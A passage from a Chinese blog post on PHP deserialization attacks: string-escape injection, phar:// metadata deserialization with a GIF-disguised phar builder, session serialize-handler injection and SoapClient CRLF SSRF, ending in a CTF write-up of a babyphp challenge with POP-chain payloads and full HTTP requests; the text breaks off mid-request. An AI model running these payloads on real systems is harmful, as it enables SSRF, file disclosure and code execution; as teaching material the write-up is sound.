class="php">O:6:&quot;sakura&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;HY&quot;;s:3:&quot;age&quot;;s:2:&quot;25&quot;;&#125;</code></pre><p>我们尝试多给name一些H看会发生什么</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210165216207.png" alt="image-20221210165216207"></p><p>我们发现name的值的范围已经大于了HH，所以把<code>&quot;;</code>也包含进去了,所以我们是不是可以让它把原来的age部分全部包含，让php反序列化我们传入的恶意序列化值呢?</p><p>我们构造的恶意payload为:</p><pre><code class="php">25&quot;;s:3:&quot;age&quot;;s:2:&quot;99</code></pre><p>我们需要让s包含的字符有:</p><pre><code class="php">&quot;;s:3:&quot;age&quot;;s:21:&quot;25  //20个字符</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221210170054095.png" alt="image-20221210170054095"></p><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p><strong>概要</strong></p><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br> 这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p><p><strong>关于流包装</strong></p><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p><pre><code class="php">include(&#39;php://filter/read=convert.base64-encode/resource=index.php&#39;);include(&#39;data://text/plain;base64,xxxxxxxxxxxx&#39;);</code></pre><p><code>phar://</code>也是流包装的一种</p><p><strong>漏洞成因</strong></p><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><p><strong>原理分析</strong></p><p>phar由四个部分组成，分别是stub、manifest describing the   contents、 the file contents、 [optional] a signature for verifying Phar   integrity (phar file format only)</p><p>stub:标识作用，格式为xxx，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p><p>manifest describing the contents:其实可以理解为phar文件本质上是一种压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221211172536017.png" alt="image-20221211172536017"></p><p> the file contents:这里指的是被压缩文件的内容；</p><p>[optional] a signature for verifying Phar integrity (phar file format only):签名，放在结尾；</p><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><pre><code class="php">&lt;?phpclass TestObject &#123;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new TestObject();$o -&gt; data=&#39;sakura&#39;;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>访问一下，发现同目录下生成了一个.phar后缀的文件(如果这步无法创建，请修改php.ini的配置，设置phar.readonly = off 并去掉前面的分号)</p><p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027213811961.png"><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027213811961.png" alt="image-20211027213811961"></a></p><p>打开：</p><p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215216183.png"><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027215216183.png" alt="image-20211027215216183"></a></p><p>发现写入的内容已经被序列化。</p><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221211172631232.png" alt="image-20221211172631232"></p><p>当然不止上面这些</p><pre><code class="php">可参考链接:https://blog.zsxsoft.com/post/38//exifexif_thumbnailexif_imagetype    //gdimageloadfontimagecreatefrom***系列函数    //hash    hash_hmac_filehash_filehash_update_filemd5_filesha1_file    // file/urlget_meta_tagsget_headers    //standard getimagesizegetimagesizefromstring    // zip   $zip = new ZipArchive();$res = $zip-&gt;open(&#39;c.zip&#39;);$zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;$z = &#39;compress.zlib://phar:///home/sx/test.phar/test.txt&#39;;//配合其他协议：(SUCTF)//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d///当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。//php://filter/read=convert.base64-encode/resource=phar://phar.phar//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。&lt;?php    $pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));    @$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar://phar.phar/aa&#39;);?&gt;    // Mysql//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper//配置一下mysqld://[mysqld]//local-infile=1//secure_file_priv=&quot;&quot;    &lt;?phpclass A &#123;    public $s = &#39;&#39;;    public function __wakeup () &#123;        system($this-&gt;s);    &#125;&#125;$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;, &#39;testtable&#39;, 3306);$p = mysqli_query($m, &#39;LOAD DATA LOCAL INFILE \&#39;phar://test.phar/test\&#39; INTO TABLE a  LINES TERMINATED BY \&#39;\r\n\&#39;  IGNORE 1 LINES;&#39;);?&gt;</code></pre><p><strong>漏洞利用</strong></p><p>phar_fan.php</p><pre><code>&lt;?phpclass TestObject&#123;    function __destruct()    &#123;        echo $this -&gt; data;   // TODO: Implement __destruct() method.    &#125;&#125;include(&#39;phar://phar.phar&#39;);?&gt;</code></pre><p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215532641.png"><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20211027215532641.png" alt="image-20211027215532641"></a></p><p>我们来简要说明下整个调用流程：</p><p>访问 phar_fun.php这个文件</p><p>执行incleude代码</p><p>解析phar文件</p><p>将里面的meta-data反序列化，在上述代码中也就是TestObject这个对象。</p><p>对象销毁，调用魔术方法__destruct()</p><p>执行echo语句完成攻击。</p><p><strong>将phar伪造成其他格式的文件</strong></p><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre><code class="php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;sakura.phar&quot;);    $phar = new Phar(&quot;sakura.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>然后调用phar://sakura.php</p><p>是一样的效果。</p><p><strong>漏洞的利用条件</strong></p><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><h1 id="php-session反序列化"><a href="#php-session反序列化" class="headerlink" title="php session反序列化"></a>php session反序列化</h1><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储的方式就是由配置项session_save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容</p><p>在php.ini中存在三项配置项：</p><pre><code class="php">session.save_path=&quot;&quot;   --设置session的存储路径session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)</code></pre><p>session.serialize_handler存在以下几种</p><pre><code class="php">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值php 键名+竖线（|）+经过serialize()函数处理过的值php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</code></pre><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。<br>php_binary引擎格式</p><pre><code class="php">&lt;0x04&gt;names:5:&quot;Smi1e&quot;;</code></pre><p>php引擎格式</p><pre><code class="php">name|s:5:&quot;Smi1e&quot;;</code></pre><p>php_searialize引擎格式</p><pre><code class="php">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;Smi1e&quot;;&#125;</code></pre><p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。<br>例如传入</p><pre><code class="php">$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;</code></pre><p>序列化引擎使用的是php_serialize，那么储存的session文件为</p><pre><code class="php">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code></pre><p>而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:“name”;s:5:”当作键名，而把O:5:“Smi1e”:1:{s:4:“test”;s:3:“AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p><h1 id="PHP原生类SoapClient反序列化利用"><a href="#PHP原生类SoapClient反序列化利用" class="headerlink" title="PHP原生类SoapClient反序列化利用"></a>PHP原生类SoapClient反序列化利用</h1><p> soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。<br>类介绍：  </p><pre><code class="php">SoapClient &#123;    /* 方法 */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;</code></pre><p> 存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。  </p><pre><code class="php">函数形式：    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])第一个参数为指明是否为wsdl模式，为null则为非wsdl模式wsdl，就是一个xml格式的文档，用于描述Web Server的定义第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间</code></pre><p> 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="img"></p><p><strong>CRLF</strong></p><p> 从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p>第一个参数是用来指明是否是 wsdl 模式。</p><p>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="img"></p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="img"></p><p>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据</p><p>在header里User-Agent在Content-Type前面</p><pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :The user_agent option specifies string to use in User-Agent header.</code></pre><p>user_agent同样可以注入CRLF，控制Content-Type的值</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=my_session&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="img"></p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1665299243252-81156156-b050-4637-bea8-54bd0d302863.png" alt="img"></p><p>如上，使用SoapClient<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。</p><h1 id="安洵杯2022-babyphp"><a href="#安洵杯2022-babyphp" class="headerlink" title="安洵杯2022  babyphp"></a>安洵杯2022  babyphp</h1><p>这题结合了pop链构造，php原生类使用，和php session反序列化的利用</p><p>index.php</p><pre><code class="php">&lt;?phpheader(&quot;Content-Type: text/html; charset=utf-8&quot;);class A&#123;    public $a;    public $b;    public function __wakeup()    &#123;        $this-&gt;a = &quot;babyhacker&quot;;        print (&quot;this is wakeup&quot;);        print ($this-&gt;a);    &#125;    public function __invoke()    &#123;        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;            print (&quot;this is invoke&quot;);            print ($this-&gt;a);            $this-&gt;b-&gt;uwant();        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public $k;    function __destruct()    &#123;        $this-&gt;b = $this-&gt;k;        die($this-&gt;a);    &#125;&#125;class C&#123;    public $a;    public $c;    public function __toString()&#123;        $cc=$this-&gt;c;        return $cc();    &#125;    public function uwant()    &#123;        if($this-&gt;a==&quot;phpinfo&quot;)&#123;            phpinfo();        &#125;else&#123;            print (array(reset($_SESSION),$this-&gt;a));            call_user_func(array(reset($_SESSION),$this-&gt;a));        &#125;    &#125;&#125;if (isset($_GET[&#39;d0g3&#39;])) &#123;    ini_set($_GET[&#39;baby&#39;], $_GET[&#39;d0g3&#39;]);    session_start();    $_SESSION[&#39;sess&#39;] = $_POST[&#39;sess&#39;];&#125;else&#123;    session_start();    if (isset($_POST[&quot;pop&quot;])) &#123;        unserialize($_POST[&quot;pop&quot;]);    &#125;&#125;var_dump($_SESSION);highlight_file(__FILE__);</code></pre><p>flag.php</p><pre><code class="php">&lt;?phpsession_start();highlight_file(__FILE__);//flag在根目录下if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;        $f1ag=implode(array(new $_GET[&#39;a&#39;]($_GET[&#39;b&#39;])));    $_SESSION[&quot;F1AG&quot;]= $f1ag;&#125;else&#123;       echo &quot;only localhost!!&quot;;&#125;</code></pre><h3 id="尝试获取phpinfo-构造pop链条"><a href="#尝试获取phpinfo-构造pop链条" class="headerlink" title="尝试获取phpinfo,构造pop链条"></a>尝试获取phpinfo,构造pop链条</h3><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);class A&#123;    public $a;    public $b;    public function __wakeup()    &#123;        $this-&gt;a = &quot;babyhacker&quot;;        print (&quot;this is wakeup&quot;);        print ($this-&gt;a);    &#125;    public function __invoke()    &#123;        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;            print (&quot;this is invoke&quot;);            print ($this-&gt;a);            $this-&gt;b-&gt;uwant();        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public $k;    function __destruct()    &#123;        $this-&gt;b = $this-&gt;k;        die($this-&gt;a);    &#125;&#125;class C&#123;    public $a;    public $c;    public function __toString()&#123;        $cc=$this-&gt;c;        return $cc();    &#125;    public function uwant()    &#123;        if($this-&gt;a==&quot;phpinfo&quot;)&#123;            phpinfo();        &#125;else&#123;            print (array(reset($_SESSION),$this-&gt;a));            call_user_func(array(reset($_SESSION),$this-&gt;a));        &#125;    &#125;&#125;$B = new B();$B-&gt;a=new C();$B-&gt;a-&gt;c=new A();$B-&gt;a-&gt;c-&gt;b=$B-&gt;a;$B-&gt;a-&gt;c-&gt;a=&quot;0e215962017&quot;;  \\双md5绕过$B-&gt;a-&gt;a=&quot;phpinfo&quot;;print (serialize($B));</code></pre><p>生成如下payload:</p><p>然后要绕过这个A类里的wakeup函数,使用fastdestruct,在末尾去点个}即可</p><pre><code class="php">O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;r:2;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572452999-4c7c0d9f-7e02-4554-b6fe-3cb50bd081e1.png" alt="img"></p><h3 id="php-session反序列化-1"><a href="#php-session反序列化-1" class="headerlink" title="php session反序列化"></a>php session反序列化</h3><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572514590-86d553ce-17ed-4ceb-9380-f387e618fb16.png" alt="img"></p><p>php中的seiion中的内容并不是放在内存中的，而是以文件的方式来存储的，存储的方式就是由配置项session_save_handler来进行确定的，默认是以文件的方式存储。</p><p>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容</p><p> 在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。  </p><p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。</p><p>例如传入</p><pre><code class="php">$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;</code></pre><p>序列化引擎使用的是php_serialize，那么储存的session文件为</p><pre><code class="php">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code></pre><p>而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:“name”;s:5:”当作键名，而把O:5:“Smi1e”:1:{s:4:“test”;s:3:“AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p><p>所以我们就可以利用这点来构造session序列化,</p><pre><code class="php">POST /?d0g3=php_serialize&amp;baby=session.serialize_handlersess=|xxx</code></pre><p>而在flag.php中有</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572974964-ddcf9fb4-9d32-4e4e-9206-4bdb6d083974.png" alt="img"></p><p>我们显而易见是要构造soapclient类去SSRF,然后利用flag中的函数构造原生类去读取文件</p><p>脚本如下:</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1:80/flag.php?a=DirectoryIterator&amp;b=glob:///*f*&#39;;$post_string = &#39;HY=666&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl&#39;);$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo urlencode($aaa);?&gt;</code></pre><p>注意在本题中由于涉及倒session问题，PHPSESSID一定要一致</p><p>最终可得到payload:</p><pre><code class="php">POST /?d0g3=php_serialize&amp;baby=session.serialize_handler HTTP/1.1Host: 47.108.29.107:10354User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 502Origin: http://47.108.29.107:10354Connection: closeReferer: http://47.108.29.107:10354/Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hlUpgrade-Insecure-Requests: 1sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A62%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2F%2Af%2A%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p>我们可以通过这种办法把session写进去</p><h3 id="使用pop链触发ssrf"><a href="#使用pop链触发ssrf" class="headerlink" title="使用pop链触发ssrf"></a>使用pop链触发ssrf</h3><p>可以在类中看到调用</p><pre><code class="php">call_user_func(array(reset($_SESSION), $this-&gt;a))</code></pre><p>这里call_user_func的用法，就是执行类中的静态函数或者一个对象的方法</p><p>如果我们要ssrf访问flag.php,我们就使用原生类SoapClient该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p><p>同时__call的触发方法就是在调用这个对象不存在的一个方法时触发，刚好符合我们的需求</p><p>所以我们稍微修改下pop链条就可以触发ssrf</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574331967-d04a8061-386d-4121-852e-17431ba2c643.png" alt="img"></p><pre><code class="php">O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;sakura&quot;;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;r:2;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;</code></pre><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>1.先利用session反序列化传入session的值</p><pre><code class="php">POST /?d0g3=php_serialize&amp;baby=session.serialize_handler HTTP/1.1Host: 47.108.29.107:10354User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 502Origin: http://47.108.29.107:10354Connection: closeReferer: http://47.108.29.107:10354/Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hlUpgrade-Insecure-Requests: 1sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A62%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2F%2Af%2A%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574440522-428f74a1-d1f1-4232-beb7-51070680d9f1.png" alt="img"></p><p>2.调用pop链进行SSRF</p><pre><code class="php">POST / HTTP/1.1Host: 47.108.29.107:10354User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 279Origin: http://47.108.29.107:10354Connection: closeReferer: http://47.108.29.107:10354/Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hlUpgrade-Insecure-Requests: 